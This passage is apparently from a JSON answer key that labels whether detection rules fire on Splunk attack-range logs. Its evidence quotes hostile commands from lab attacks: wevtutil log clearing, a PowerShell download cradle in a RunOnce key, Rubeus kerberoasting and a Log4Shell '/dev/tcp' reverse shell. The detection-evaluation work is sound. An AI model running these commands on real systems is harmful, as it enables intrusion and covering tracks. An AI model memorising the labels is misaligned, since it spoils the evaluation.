+      "ord 583 RecordNumber 271312 (06/15/2021 12:00:15 PM): 4688, New Process Name C:\\Windows\\System32\\cmd.exe, Process Command Line \"cmd.exe\" /s /k pushd \"C:\\Temp\" - batch session from C:\\Temp"
+     ],
+     "reason": "wevtutil cl Application is in selection_wevtutil and 4688 with command line is accepted; the sl /e:false disable (ord 611) is outside scope but does not change the label."
+    },
+    {
+     "detection": "T1070.001_system_log_cleared",
+     "label": "telemetry",
+     "evidence": [
+      "ord 614 RecordNumber 271326 (06/15/2021 12:00:19 PM): 4688, New Process Name C:\\Windows\\System32\\wevtutil.exe, Process Command Line wevtutil  cl Application",
+      "Security-only file (4688/4624/4634/4672); no System 104"
+     ],
+     "reason": "Clearing the Application log writes System 104, which this Security-only file does not contain."
+    }
+   ]
+  },
+  {
+   "label": "H76",
+   "dataset": "splunk/T1070.001/windows_pwh_log_cleared/wevtutil_clear_log.log",
+   "sha256": "f84a71b701ac5474554b961a28161f0d0a744a1665800f587a081cdfa702dbcb",
+   "summary": "XML events from ar-win-2: the ShrinkLocker VBS (wscript.exe C:\\Temp\\shrink_locker.vbs) runs wevtutil cl \"Windows PowerShell\" and wevtutil cl \"TabletPC_InputPanel_Channel\" (Sysmon 1 and Security 4688 for each, plus Sysmon 7 image loads of wevtutil).",
+   "labels": [
+    {
+     "detection": "T1070.001_event_log_clearing",
+     "label": "attack",
+     "evidence": [
+      "ord 17 EventRecordID 7799 (2024-06-17T16:00:09.392585200Z): 1, Image C:\\Windows\\System32\\wevtutil.exe, OriginalFileName wevtutil.exe, CommandLine wevtutil cl \"Windows PowerShell\", ParentImage C:\\Windows\\System32\\wscript.exe, ParentCommandLine \"C:\\Windows\\System32\\WScript.exe\" \"C:\\Temp\\shrink_locker.vbs\"",
+      "ord 2 EventRecordID 371900 (2024-06-17T16:00:09.387224600Z): 4688, NewProcessName C:\\Windows\\System32\\wevtutil.exe, CommandLine wevtutil cl \"Windows PowerShell\", ParentProcessName C:\\Windows\\System32\\wscript.exe",
+      "ord 19 EventRecordID 7799 (2024-06-17T17:00:09.392585200Z): 1, OriginalFileName wevtutil.exe, CommandLine wevtutil cl \"TabletPC_InputPanel_Channel\"",
+      "ord 18 EventRecordID 371900 (2024-06-17T16:00:09.387224600Z): 4688, CommandLine wevtutil cl \"TabletPC_InputPanel_Channel\""
+     ],
+     "reason": "wevtutil cl (matched by path and OriginalFileName) is in selection_wevtutil; Sysmon 1 is the primary telemetry; no filter applies."
+    },
+    {
+     "detection": "T1070.001_system_log_cleared",
+     "label": "telemetry",
+     "evidence": [
+      "ord 17 EventRecordID 7799 (2024-06-17T16:00:09.392585200Z): 1, CommandLine wevtutil cl \"Windows PowerShell\"",
+      "ord 19 EventRecordID 7799 (2024-06-17T17:00:09.392585200Z): 1, CommandLine wevtutil cl \"TabletPC_InputPanel_Channel\"",
+      "file holds Security 4688 and Sysmon 1/7 only; no System 104"
+     ],
+     "reason": "Two non-Security logs were cleared (System 104 expected), but the file has no System log."
+    }
+   ]
+  },
+  {
+   "label": "H77",
+   "dataset": "splunk/T1110.003/generic_password_spray/password_spray_attack.log",
+   "sha256": "0b1f90ae5e05cac0d21aa10dbc921734b74e9259674f79c9484ea54d77930807",
+   "summary": "XML Security log from VICTIM-PC: NTLM network-logon failures (4625, type 3) from workstation ATTACKER for not_the_admin_1..10 (SubStatus 0xC0000064) and Administrator (0xC0000064 and two 0xC000006A), plus Administrator failures from workstations ATTACKER_1..10, all within 16:46-16:47 UTC; 4624 successes for VICTIM. Every failure has IpAddress \"-\".",
+   "labels": [
+    {
+     "detection": "T1110.003_password_spray_burst",
+     "label": "scope",
+     "evidence": [
+      "ord 20 EventRecordID 12955 (2023-11-06T16:47:23.942186900Z): 4625, TargetUserName not_the_admin_1, Status 0xc000006d, SubStatus 0xc0000064, LogonType 3, IpAddress -, WorkstationName ATTACKER",
+      "ord 2 EventRecordID 12991 (2023-11-06T16:47:26.056311500Z): 4625, TargetUserName not_the_admin_10, Status 0xc000006d, SubStatus 0xc0000064, LogonType 3, IpAddress -, WorkstationName ATTACKER",
+      "ord 38 EventRecordID 12866 (2023-11-06T16:46:22.945221700Z): 4625, TargetUserName Administrator, Status 0xc000006d, SubStatus 0xc000006a, LogonType 3, IpAddress -, WorkstationName ATTACKER",
+      "ord 31 EventRecordID 12553 (2023-11-06T16:47:23.938540700Z): 4625, TargetUserName Administrator, Status 0xc000006d, SubStatus 0xc0000064, LogonType 3, IpAddress -, WorkstationName ATTACKER_10",
+      "34 x 4625 with qualifying SubStatus for 11 distinct accounts in one 10-minute window, but 34/34 have IpAddress \"-\""
+     ],
+     "reason": "A spray shape (11 accounts, one workstation, 4 minutes), but the documented base rule drops attempts without a remote address and the correlation groups by IpAddress, so no failure is counted."
+    }
+   ]
+  },
+  {
+   "label": "H78",
+   "dataset": "splunk/T1218.011/atomic_red_team/windows-security.log",
+   "sha256": "3826342e101d8dae7c43c56642e5b3a7fd1a918b0bd420f5501ad23791b06265",
+   "summary": "Security log of attack-range DC win-dc-826 for the T1218.011 atomic run: AMI boot, domain promotion and agent install background (logons, account management, Kerberos to the DC itself). 4688 exists only for boot-time processes with empty command lines; no rundll32 activity.",
+   "labels": [
+    {
+     "detection": "T1218.011_rundll32_suspicious_execution",
+     "label": "telemetry",
+     "evidence": [
+      "ord 1 RecordNumber 231333 (11/30/2020 01:36:21 PM): 4688, New Process Name C:\\Windows\\System32\\autochk.exe, Process Command Line '', Creator Process Name C:\\Windows\\System32\\smss.exe",
+      "61 x 4688, all boot sequences (smss, csrss, wininit, winlogon, services, lsass, autochk, setupcl) with empty Process Command Line; last 4688 at 11/30/2020 02:40 PM; rundll32 appears only as the process of two 4616 time-change events"
+     ],
+     "reason": "The rundll32 tests left no process-creation record: the file has no command-line 4688 or Sysmon 1 for the attack window."
+    }
+   ]
+  },
+  {
+   "label": "H79",
+   "dataset": "splunk/T1218.011/atomic_red_team/windows-system.log",
+   "sha256": "3ff54b9323b77ea60d0b11b33b8ed86692b426075ea5dcdbad14c07bc4df3e7b",
+   "summary": "System log of the same T1218.011 run (win-dc-826): service state changes, DC promotion services and Splunk/Sysmon/npf 7045 installs; nothing from the rundll32 tests.",
+   "labels": [
+    {
+     "detection": "T1218.011_rundll32_suspicious_execution",
+     "label": "telemetry",
+     "evidence": [
+      "System log only (7036, 7045, 7040, 10016, ...); no Sysmon 1 or Security 4688"
+     ],
+     "reason": "Rundll32 proxy execution is seen through process creation, which a System log does not hold."
+    }
+   ]
+  },
+  {
+   "label": "H80",
+   "dataset": "splunk/T1218.011/update_per_user_system/rundll32_updateperusersystem.log",
+   "sha256": "458df92c3189c54c80d656600bd3a9a9892b585a77f4abbba0d13bf321d4e024",
+   "summary": "XML: one Security 4688 and one Sysmon 1 on ar-win-dc - rundll32.exe user32.dll,UpdatePerUserSystemParameters started by cmd.exe /c \"C:\\Temp\\1.bat\" (administrator).",
+   "labels": [
+    {
+     "detection": "T1218.011_rundll32_suspicious_execution",
+     "label": "scope",
+     "evidence": [
+      "ord 2 EventRecordID 129352 (2023-12-12T15:14:17.222095800Z): 1, Image C:\\Windows\\System32\\rundll32.exe, OriginalFileName RUNDLL32.EXE, CommandLine rundll32.exe  user32.dll,UpdatePerUserSystemParameters, ParentImage C:\\Windows\\System32\\cmd.exe, ParentCommandLine C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Temp\\1.bat\" \", CurrentDirectory C:\\Temp\\",
+      "ord 1 EventRecordID 690764 (2023-12-12T15:14:17.219828300Z): 4688, NewProcessName C:\\Windows\\System32\\rundll32.exe, CommandLine rundll32.exe  user32.dll,UpdatePerUserSystemParameters, ParentProcessName C:\\Windows\\System32\\cmd.exe"
+     ],
+     "reason": "Rundll32 proxying a System32 DLL export by name: no javascript:/RunHTMLApplication, no AppData/ProgramData/Users\\Public/Windows\\Temp/Downloads path in its command line (C:\\Temp is not a listed path and appears only in the parent), not comsvcs MiniDump, and it has arguments - it misses all four susp_* selections."
+    }
+   ]
+  },
+  {
+   "label": "H81",
+   "dataset": "splunk/T1547.001/atomic_red_team/t1547001-runonce.log",
+   "sha256": "734596074b0bc33598fae148a395d671128411b03ffe12784bf32b743da3b3cc",
+   "summary": "Classic Security + PowerShell/Operational log from win-dc-cloudarrod-133 that also embeds 22 Sysmon XML records as standalone lines (EID 1 x13, 12 x4, 13 x5; not counted in files.json). Atomic T1547.001 RunOnce tests run twice via Invoke-AtomicTest: PowerShell sets HKLM RunOnce\\NextRun to a PowerShell IEX download cradle and reg.exe adds RunOnceEx\\0001\\Depend (C:\\Path\\AtomicRedTeam.dll), then cleanup deletes both; once, reg.exe from an interactive cmd.exe adds HKCU RunOnce\\RunScript (C:\\setup\\script.cmd). The harness parent \"powershell.exe -noninteractive -encodedcommand\" appears only as ParentCommandLine, never as a process command line.",
+   "labels": [
+    {
+     "detection": "T1547.001_registry_run_key_persistence",
+     "label": "attack",
+     "evidence": [
+      "embedded XML EventRecordID 116644 (2022-02-17T02:15:42.784354400Z): Sysmon 13, EventType SetValue, Image C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, TargetObject HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\NextRun, Details powershell.exe \"IEX (New-Object Net.WebClient).DownloadString(...)\" [URL omitted]",
+      "embedded XML EventRecordID 111497 (2022-02-17T02:13:43.772483600Z): Sysmon 13, EventType SetValue, Image C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, TargetObject HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\NextRun, Details powershell.exe \"IEX (New-Object Net.WebClient).DownloadString(...)\" [URL omitted]",
+      "embedded XML EventRecordID 116616 (2022-02-17T02:15:42.588937000Z): Sysmon 13, TargetObject HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend\\1, Details C:\\Path\\AtomicRedTeam.dll - data not suspicious per scope",
+      "embedded XML EventRecordID 111544 (2022-02-17T02:13:44.064610100Z): Sysmon 13, TargetObject HKU\\S-1-5-21-1043487626-1088152272-4246291469-500\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\RunScript, Details C:\\setup\\script.cmd - data not suspicious per scope"
+     ],
+     "reason": "A RunOnce value whose data starts PowerShell is in scope and no per-user-app filter applies. Caveat: these Sysmon 13 records are XML lines embedded in a classic-format file; the classic-text events (4688 reg.exe/powershell, 4104) are not read by this rule."
+    }
+   ]
+  },
+  {
+   "label": "H82",
+   "dataset": "splunk/T1547.001/atomic_red_team/windows-security.log",
+   "sha256": "70787fcec2ce392259d442b47602177b5544be2f81a7326eb5d553362f235c06",
+   "summary": "Security log of attack-range DC win-dc-942 for the T1547.001 atomic run: build/background only (logons, account management, Kerberos to the DC itself); 4688 only at boot with empty command lines; no registry telemetry.",
+   "labels": [
+    {
+     "detection": "T1547.001_registry_run_key_persistence",
+     "label": "telemetry",
+     "evidence": [
+      "Security-only file (5153 events: 4624/4672/4907/4634/4648/4769/4768/...); no Sysmon 13 registry value-set events"
+     ],
+     "reason": "The rule reads Sysmon 13 on Run/RunOnce keys; the file has none."
+    }
+   ]
+  },
+  {
+   "label": "H83",
+   "dataset": "splunk/T1547.001/atomic_red_team/windows-system.log",
+   "sha256": "793762c6cb4fff1350baf91e59cd4a480e627e4c85abff895a75cc5364ba1c54",
+   "summary": "System log of the T1547.001 run (win-dc-942): service state changes, DC promotion services and agent 7045 installs only.",
+   "labels": [
+    {
+     "detection": "T1547.001_registry_run_key_persistence",
+     "label": "telemetry",
+     "evidence": [
+      "System log only (7036, 7045, 7040, 10016, ...); no Sysmon 13"
+     ],
+     "reason": "Run key writes are seen through Sysmon 13, which a System log does not hold."
+    }
+   ]
+  },
+  {
+   "label": "H84",
+   "dataset": "splunk/T1558.003/atomic_red_team/windows-security.log",
+   "sha256": "1647b6eb3c96c336463a2443a029a2f066d59501f2ffde62485a0d07e927cbd6",
+   "summary": "A single Security 4769 on win-dc-156: the DC machine account WIN-DC-156$ obtains an RC4 (0x17) ticket for service WIN-DC-156$ from ::1 (options 0x40810000, success). No user-account service ticket is present.",
+   "labels": [
+    {
+     "detection": "T1558.003_kerberoasting_rc4_tgs",
+     "label": "scope",
+     "evidence": [
+      "ord 1 RecordNumber 229743 (03/29/2021 01:44:33 PM): 4769, Account Name WIN-DC-156$@ATTACKRANGE.LOCAL, Service Name WIN-DC-156$, Ticket Encryption Type 0x17, Failure Code 0x0, Client Address ::1, Ticket Options 0x40810000"
+     ],
+     "reason": "An RC4 ticket, but its ServiceName is a machine account ($), which the rule excludes. Uncertain: this lone ticket may be the atomic test (DC-self tickets in the other attack-range logs are AES) or ordinary DC self-traffic."
+    },
+    {
+     "detection": "T1558.003_kerberoasting_volume",
+     "label": "scope",
+     "evidence": [
+      "ord 1 RecordNumber 229743 (03/29/2021 01:44:33 PM): 4769, Service Name WIN-DC-156$, Client Address ::1",
+      "one service ticket in the file"
+     ],
+     "reason": "The base rule drops computer-account services and requests from the DC itself (::1); a single service would also be below the threshold of 5."
+    }
+   ]
+  },
+  {
+   "label": "H85",
+   "dataset": "splunk/T1558.003/atomic_red_team/windows-system.log",
+   "sha256": "c226e7febc575119fc94524ec32112517749aa5af4ad7c5d32d8d84a47a90f3d",
+   "summary": "System log of the T1558.003 atomic run (win-dc-156, win-host-374): service state changes and agent installs, plus a GENSERV service (C:\\Windows\\System32\\notepad.exe, auto start, LocalSystem) installed on win-host-374 and later on win-dc-156, where it fails to start (7009/7000).",
+   "labels": [
+    {
+     "detection": "T1558.003_kerberoasting_rc4_tgs",
+     "label": "telemetry",
+     "evidence": [
+      "System log only (7036, 55, 6, 10016, 7045, ...); no Security 4769"
+     ],
+     "reason": "Kerberoasting is visible only in DC Security 4769, which this file does not contain."
+    },
+    {
+     "detection": "T1558.003_kerberoasting_volume",
+     "label": "telemetry",
+     "evidence": [
+      "System log only; no Security 4769"
+     ],
+     "reason": "The correlation reads DC Security 4769, absent here."
+    },
+    {
+     "detection": "T1569.002_suspicious_service_installation",
+     "label": "blind-spot",
+     "evidence": [
+      "ord 1037 RecordNumber 82207 (10/16/2020 08:11:57 AM): 7045, Service Name GENSERV, Service File Name C:\\Windows\\System32\\notepad.exe, Service Start Type auto start, Service Account LocalSystem",
+      "ord 1236 RecordNumber 82442 (10/16/2020 08:40:45 AM): 7045, Service Name GENSERV, Service File Name C:\\Windows\\System32\\notepad.exe, Service Start Type auto start, Service Account LocalSystem",
+      "ord 1240 RecordNumber 82447 / ord 1241 RecordNumber 82446: 7000/7009 GENSERV failed to start (timeout)"
+     ],
+     "reason": "A test-style service with a non-default name and a System32 binary: no interpreter, share or writable path, not .bat/.cmd, name not in the default list, not %SystemRoot%\\<8 letters>.exe - the documented gap \"service name and binary randomized + binary placed in System32\". Origin uncertain (not part of kerberoasting); the other 7045s are agents and match nothing."
+    }
+   ]
+  },
+  {
+   "label": "H86",
+   "dataset": "splunk/T1558.003/rubeus/windows-security.log",
+   "sha256": "b5d694ca38e0ad78f779cfd91421cb37bf2514cbbc6c25afa7ac84c1b24e9313",
+   "summary": "Security log from win-dc-128 / win-host-987: administrator runs klist purge and then C:\\tools\\Rubeus.exe kerberoast on the DC; 30 RC4 (0x17) service tickets for srv_http1-10, srv_smb1-10 and srv_sql1-10 are issued to Administrator from ::1 within 3 seconds, amid Splunk forwarder and WFP noise.",
+   "labels": [
+    {
+     "detection": "T1558.003_kerberoasting_rc4_tgs",
+     "label": "attack",
+     "evidence": [
+      "ord 335 RecordNumber 1846465068 (02/11/2022 07:29:07 PM): 4769, Account Name Administrator@ATTACKRANGE.LOCAL, Service Name srv_smb8, Ticket Encryption Type 0x17, Failure Code 0x0, Client Address ::1",
+      "ord 343 RecordNumber 1846465060 (02/11/2022 07:29:07 PM): 4769, Account Name Administrator@ATTACKRANGE.LOCAL, Service Name srv_smb1, Ticket Encryption Type 0x17, Failure Code 0x0, Client Address ::1",
+      "ord 371 RecordNumber 1846465083 (02/11/2022 07:29:09 PM): 4769, Account Name Administrator@ATTACKRANGE.LOCAL, Service Name srv_sql3, Ticket Encryption Type 0x17, Failure Code 0x0, Client Address ::1",
+      "30 x 4769 (ord 335-371), all 0x17 / 0x0 for user service accounts",
+      "ord 334 RecordNumber 1846465051 (02/11/2022 07:29:06 PM): 4688, New Process Name C:\\Tools\\Rubeus.exe, Process Command Line Rubeus.exe  kerberoast, Creator Process Name C:\\Windows\\System32\\cmd.exe"
+     ],
+     "reason": "Successful RC4 service tickets for user-based service accounts (no $, not krbtgt): in scope. The RC4 rule documents no exclusion for requests from the DC."
+    },
+    {
+     "detection": "T1558.003_kerberoasting_volume",
+     "label": "scope",
+     "evidence": [
+      "ord 335 RecordNumber 1846465068 (02/11/2022 07:29:07 PM): 4769, Service Name srv_smb8, Client Address ::1",
+      "30 distinct user ServiceNames in one 10-minute window (07:29:07-07:29:09 PM), every one with Client Address ::1",
+      "ord 334 RecordNumber 1846465051 (02/11/2022 07:29:06 PM): 4688, New Process Name C:\\Tools\\Rubeus.exe, Process Command Line Rubeus.exe  kerberoast - Rubeus ran on the DC itself"
+     ],
+     "reason": "Volume roasting, but the documented base rule drops requests from the domain controller itself, and all 30 come from ::1 because Rubeus ran on the DC."
+    }
+   ]
+  },
+  {
+   "label": "H87",
+   "dataset": "splunk/T1569.002/atomic_red_team/windows-security.log",
+   "sha256": "10f6e20475b6c0513b5b2fd1ea0716b53f50c6de733b9df0f3595b68864281cb",
+   "summary": "Security log of attack-range DC win-dc-906 for the T1569.002 atomic run: build/background only (logons, account management, Kerberos to the DC itself); no 4697; 4688 only at boot with empty command lines.",
+   "labels": [
+    {
+     "detection": "T1569.002_suspicious_service_installation",
+     "label": "telemetry",
+     "evidence": [
+      "Security-only file (7451 events) with no 4697 and no System 7045; the ARTService install of this run appears only in the System log (H88 ord 1056)"
+     ],
+     "reason": "The rule reads System 7045 or Security 4697; neither is in this file."
+    }
+   ]
+  },
+  {
+   "label": "H88",
+   "dataset": "splunk/T1569.002/atomic_red_team/windows-system.log",
+   "sha256": "097f16e7d92b0c75797244543e88a9eeaad80b861a31b053feddeb68fcd1772e",
+   "summary": "System log of the T1569.002 atomic run (win-dc-906): DC promotion and agent 7045s, then ARTService installed with ImagePath cmd.exe /c powershell.exe ... (Atomic \"Execute a Command as a Service\"); its start times out (7009/7000).",
+   "labels": [
+    {
+     "detection": "T1569.002_suspicious_service_installation",
+     "label": "attack",
+     "evidence": [
+      "ord 1056 RecordNumber 89743 (04/05/2021 02:15:34 PM): 7045, Service Name ARTService, Service File Name C:\\Windows\\system32\\cmd.exe /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\\art...[+11], Service Start Type demand start, Service Account LocalSystem",
+      "ord 1054 RecordNumber 89745 / ord 1055 RecordNumber 89744: 7000/7009 ARTService start timeout"
+     ],
+     "reason": "cmd /c and PowerShell in the ImagePath match susp_path. The other 7045s (DNS/AD services, Splunk, Sysmon, npf, Mozilla) match no fingerprint."
+    }
+   ]
+  },
+  {
+   "label": "H89",
+   "dataset": "splunk/T1190/crushftp/windows-sysmon.log",
+   "sha256": "2e9efea0d5421db1f9f2889ba418fc5f868fd38cb9654dc7312a9d31c0e28d0c",
+   "summary": "One Sysmon 1 record: the CrushFTP service (C:\\Program Files\\CrushFTP10\\crushftpservice.exe) spawns 'cmd.exe /c whoami' as WIN-HOST-MHAAG-\\Administrator (High integrity), i.e. post-exploitation recon from an exploited public-facing CrushFTP server. No other telemetry.",
+   "labels": [
+    {
+     "detection": "T1190_api_auth_probing",
+     "label": "scope",
+     "evidence": [
+      "EventRecordID 13208447: Sysmon 1, ParentImage C:\\Program Files\\CrushFTP10\\crushftpservice.exe -> Image C:\\Windows\\System32\\cmd.exe (OriginalFileName Cmd.Exe), CommandLine 'cmd.exe /c whoami', User WIN-HOST-MHAAG-\\Administrator",
+      "No web-server or reverse-proxy access log records in the file (no c-ip / cs-uri-stem / sc-status data)"
+     ],
+     "reason": "Exploitation of the CrushFTP server (T1190) is visible only as host-side outcome (the FTP server process spawning cmd.exe /c whoami); the detection's scope is a web access log in which one client gets 401/403 on >=5 distinct paths in a 5-minute window, and nothing here shows rejected-path probing"
+    },
+    {
+     "detection": "T1190_object_id_enumeration",
+     "label": "scope",
+     "evidence": [
+      "EventRecordID 13208447: Sysmon 1, ParentImage C:\\Program Files\\CrushFTP10\\crushftpservice.exe -> Image C:\\Windows\\System32\\cmd.exe (OriginalFileName Cmd.Exe), CommandLine 'cmd.exe /c whoami', User WIN-HOST-MHAAG-\\Administrator",
+      "No web-server or reverse-proxy access log records in the file (no c-ip / cs-uri-stem / sc-status data)"
+     ],
+     "reason": "Exploitation of the CrushFTP server (T1190) is visible only as host-side outcome (the FTP server process spawning cmd.exe /c whoami); the detection's scope is one client sending GETs for >=3 distinct numeric basket/user/account/profile/wallet IDs per minute in a web access log, and nothing here shows object-ID walking"
+    }
+   ]
+  },
+  {
+   "label": "H90",
+   "dataset": "splunk/T1190/java/java_spawn_shell_nix.log",
+   "sha256": "eab1d19a5fe4cd073270105c69002e0f6e4270ffc7fdbc368a10272db32a1e02",
+   "summary": "Linux Sysmon EID 1 only (42 records, host sysmonlinux-jhernandez-62420-4087, 2021-12-10..14): OpenJDK 8 package installation (dpkg postinst, update-alternatives, rm of classes.jsa), `which java` from the mvn wrapper in ~/apache-log4j-poc and ~/log4j, and Maven (`java ... plexus-classworlds ... clean package -DskipTests` in ~/marshalsec) spawning `/bin/sh -c ls -1laR .../marshalsec/target/classes` twice. That Java-spawns-a-shell event is what the file is named for; it comes from building marshalsec, the JNDI server used for Log4Shell. No exploitation, network, crontab, Base64 or temp-directory activity is recorded.",
+   "labels": [
+    {
+     "detection": "T1059.004_linux_suspicious_shell_execution",
+     "label": "scope",
+     "evidence": [
+      "EventRecordID 71542 (#33): Linux Sysmon 1, Image /bin/dash, CommandLine `/bin/sh -c ls -1laR /home/ubuntu/marshalsec/target/classes`, User ubuntu",
+      "Same record: ParentImage /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java, ParentCommandLine `/usr/bin/java -classpath /usr/share/maven/boot/plexus-classworlds-2.x.jar ...` (342 chars, ends `clean package -DskipTests`)",
+      "EventRecordID 71230 (#34): same command and parent, 6 s earlier",
+      "Full-text sweep of all 42 records: no base64, crontab, /tmp/, /var/tmp/ or /dev/shm/"
+     ],
+     "reason": "A Java process spawning a Unix shell is T1059.004 behaviour, but it is outside the documented scope. Nothing is Base64-decoded into a shell (susp_b64_pipe). Image /bin/dash is not under /tmp, /var/tmp or /dev/shm (susp_tmp_binary). The shell's first argument is -c, not a script in those directories (tmp_script_shell/tmp_script_path). The shell comes from a Maven build of the attack tooling, not from exploitation."
+    }
+   ]
+  },
+  {
+   "label": "H91",
+   "dataset": "splunk/T1190/outbound_java/linux-sysmon.log",
+   "sha256": "92b164b049a2feedeace6d1726e2e7f2a7b199fd2c3558ef53468e2bdc9e9118",
+   "summary": "Linux Sysmon (12,216 records, host sysmonlinux-8267 = 10.0.1.25, 2021-12-13 21:12-21:17 UTC), mostly Splunk forwarder file and network noise. It records Log4Shell exploitation of a Java 8 app (pid 25020, user ubuntu) on port 8080. The app takes an inbound connection from 10.0.1.16, calls back to 10.0.1.16:1389 (LDAP) and 10.0.1.16:8080, then spawns `bash -c bash -i >& /dev/tcp/10.0.1.16/4444 0>&1` twice. The reverse shell connects to 10.0.1.16:4444 and runs `uname -a`. Background: amazon-ssm-agent `ps`, cron.hourly run-parts, systemd. No crontab, Base64 or temp-directory activity.",
+   "labels": [
+    {
+     "detection": "T1059.004_linux_suspicious_shell_execution",
+     "label": "scope",
+     "evidence": [
+      "EventRecordID 34917814 (#8202): Linux Sysmon 1, Image /bin/bash, CommandLine `/bin/bash -c /bin/bash -i >& /dev/tcp/10.0.1.16/4444 0>&1`, User ubuntu, ParentProcessId 25020 (ParentImage '-')",
+      "pid 25020 is /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java: Linux Sysmon 3 RID 34917811 (10.0.1.16:54192 -> 10.0.1.25:8080, inbound), RID 34917812 (-> 10.0.1.16:1389), RID 34917813 (-> 10.0.1.16:8080)",
+      "EventRecordID 34918249 (#8637): the same reverse-shell command again; its child `/bin/bash -i` (RID 34918252) connects 10.0.1.25:49286 -> 10.0.1.16:4444 (Sysmon 3 RID 34918251) and runs `uname -a` (RID 34918820)",
+      "Full-text sweep: no record contains base64, crontab, /tmp/, /var/tmp/ or /dev/shm/"
+     ],
+     "reason": "The reverse shell the exploited Java process spawns is Unix-shell execution (T1059.004), but it is outside the documented scope. No Base64 is decoded into a shell (susp_b64_pipe). The binary is /bin/bash, not under /tmp, /var/tmp or /dev/shm (susp_tmp_binary). The shell's first argument is -c, not a temp-directory script (tmp_script_shell/tmp_script_path)."
+    },
+    {
+     "detection": "T1190_api_auth_probing",
+     "label": "telemetry",
+     "evidence": [
+      "Linux Sysmon 3 RID 34917811 (#8199): java pid 25020 accepts 10.0.1.16:54192 -> 10.0.1.25:8080; RID 34917812/34917813: java -> 10.0.1.16:1389 and 10.0.1.16:8080; repeated at 21:16:22 (RID 34918211, 34918230)",
+      "The file holds only Linux-Sysmon/Operational events (EIDs 1, 3, 5, 11, 23); no web server or proxy access log"
+     ],
+     "reason": "The detection reads a web server or reverse-proxy access log (c-ip, cs-method, cs-uri-stem, sc-status); the file holds none, so it cannot see the exploitation. The exploitation is a single JNDI-injection request, so even with an access log it would not be the 5+ distinct 401/403 paths per client in 5 minutes that this correlation counts."
+    },
+    {
+     "detection": "T1190_object_id_enumeration",
+     "label": "telemetry",
+     "evidence": [
+      "Linux Sysmon 3 RID 34917811-34917813: inbound HTTP to java on 8080 followed by JNDI callbacks to 10.0.1.16",
+      "The file holds only Linux-Sysmon/Operational events; no web server or proxy access log"
+     ],
+     "reason": "The detection reads a web server or reverse-proxy access log (c-ip, cs-method, cs-uri-stem, sc-status); the file holds none, so it cannot see the exploitation. Nothing indicates a walk over numeric single-owner object IDs either; the exploit is one injected request."
+    }
+   ]
+  },
+  {
+   "label": "H92",
+   "dataset": "splunk/T1190/outbound_java/windows-security.log",
+   "sha256": "538ce1324d054f60fa2565cef79467956c8731c93dc79d4f384d45dfb47a4db4",
+   "summary": "Splunk classic Security log (28,794 records, mostly 5156; win-dc-128 and win-host-987, 2021-12-15 20:40:16-20:45:15). It comes from the same run and window as H93. It holds Splunk forwarder child processes, a SIHClient run, and an RDP logon of ATTACKRANGE\\Administrator from 72.43.121.35 (4624 type 10, 4648, 4776, AES 4768/4769). The rest is machine-account network logons, SYSVOL reads and DC WFP connections. There is no trace of the Log4Shell activity: no java process creation, and no event mentions 10.0.1.16. Nothing falls in any detection's documented scope:\n- the only 4769 (Rec 1621635347) is AES 0x12 for the machine account WIN-HOST-987$;\n- the only 4768 (Rec 1621635345) succeeded (0x0);\n- there are no 4771 or 4625 failures and no 1102;\n- none of the 80 4688 records matches a process-creation selection.",
+   "labels": [
+    {
+     "detection": "T1190_api_auth_probing",
+     "label": "telemetry",
+     "evidence": [
+      "Full-text search: no event mentions 10.0.1.16; no 4688 for java; 5156/5158 come only from win-dc-128 (splunkd, streamfwd, dns, lsass, ...)",
+      "Same hosts and window in H93: java.exe on win-host-987 makes the Log4Shell JNDI callbacks at 20:43:21 (Sysmon 3 RID 64848551-64848553)",
+      "The file holds only Security events; no web server or proxy access log"
+     ],
+     "reason": "The detection reads a web server or reverse-proxy access log (c-ip, cs-method, cs-uri-stem, sc-status); the file holds none, so it cannot see the exploitation. This Security log records none of the exploitation either. The exploit is a single JNDI-injection request, not 401/403 probing across many paths."
+    },
+    {
+     "detection": "T1190_object_id_enumeration",
+     "label": "telemetry",
+     "evidence": [
+      "No event mentions 10.0.1.16 or java; the exploitation is visible only in H93 (Sysmon 3 RID 64848551-64848553)",
+      "The file holds only Security events; no web server or proxy access log"
+     ],
+     "reason": "The detection reads a web server or reverse-proxy access log (c-ip, cs-method, cs-uri-stem, sc-status); the file holds none, so it cannot see the exploitation. Nothing indicates a numeric object-ID walk."
+    }
+   ]
+  },
+  {
+   "label": "H93",
+   "dataset": "splunk/T1190/outbound_java/windows-sysmon.log",
+   "sha256": "fb3444c80a907bf0301fb65979cd1d1a4e595f83e5bd0aa4d1eaabaf5d28c6bd",
+   "summary": "Sysmon (4,458 records, win-dc-128 and win-host-987, 2021-12-15 20:40:10-20:45:09). It records the Log4Shell callback on win-host-987: java.exe (pid 1068, ATTACKRANGE\\Administrator) accepts 10.0.1.16:38332 -> 10.0.1.15:8080, then connects to 10.0.1.16:1389 (LDAP) and 10.0.1.16:8080 at 20:43:21. No child process of java is recorded. The rest is background:\n- all 78 EID 1 are Splunk forwarder helpers or the RDP logon chain (smss, csrss, winlogon, LogonUI, dwm, rdpclip, atbroker, TSTheme);\n- the only LSASS handles are svchost (lsm.dll) with 0x1400/0x101001, which lack PROCESS_VM_READ, so they are not in T1003.001's scope;\n- registry writes are W32Time, DFSR and terminal-input, with no Run keys;\n- the DC shows LDAP, Kerberos and DNS traffic.",
+   "labels": [
+    {
+     "detection": "T1190_api_auth_probing",
+     "label": "telemetry",
+     "evidence": [
+      "Sysmon 3 RID 64848551 (#3446): java.exe pid 1068 accepts 10.0.1.16:38332 -> 10.0.1.15:8080 (Initiated false)",
+      "Sysmon 3 RID 64848552 (#3445): java.exe -> 10.0.1.16:1389; RID 64848553 (#3444): java.exe -> 10.0.1.16:8080",
+      "The file holds only Sysmon events; no web server or proxy access log"
+     ],
